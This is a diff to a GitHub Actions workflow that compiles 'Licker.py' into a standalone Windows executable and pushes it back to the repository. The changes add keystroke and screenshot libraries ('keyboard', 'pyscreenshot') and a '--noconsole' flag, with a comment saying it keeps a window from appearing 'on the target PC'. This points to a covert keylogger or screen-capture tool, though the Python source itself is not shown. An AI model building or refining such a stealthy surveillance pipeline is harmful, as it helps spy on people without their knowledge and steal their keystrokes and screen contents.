@@ -3,7 +3,7 @@ name: Build and Sync Executable
 on:
   push:
     branches: [ main ]
-  workflow_dispatch: # This allows you to run it manually from the Actions tab
+  workflow_dispatch:
 
 jobs:
   build:
@@ -15,7 +15,7 @@ jobs:
     - name: Checkout code
       uses: actions/checkout@v4
       with:
-        fetch-depth: 0 # Ensures it can push back to the repo properly
+        fetch-depth: 0
 
     - name: Set up Python
       uses: actions/setup-python@v5
@@ -25,17 +25,24 @@ jobs:
     - name: Install dependencies
       run: |
         python -m pip install --upgrade pip
-        pip install pyinstaller
+        # These are essential for your Licker.py code
+        pip install pyinstaller keyboard pyscreenshot Pillow
 
     - name: Build Executable
-      run: pyinstaller --onefile Licker.py
+      # --noconsole prevents a black window from popping up on the target PC
+      run: pyinstaller --onefile --noconsole Licker.py
 
     - name: Sync EXE to Repo
       shell: cmd
       run: |
         git config --global user.name "github-actions[bot]"
         git config --global user.email "github-actions[bot]@users.noreply.github.com"
-        copy /Y dist\Licker.exe .
-        git add Licker.exe
-        git commit -m "Auto-build: Update Licker.exe" || exit 0
-        git push
+        if exist dist\Licker.exe (
+            copy /Y dist\Licker.exe .
+            git add Licker.exe
+            git commit -m "Auto-build: Update Licker.exe" || exit 0
+            git push
+        ) else (
+            echo EXE was not found in dist folder
+            exit 1
+        )
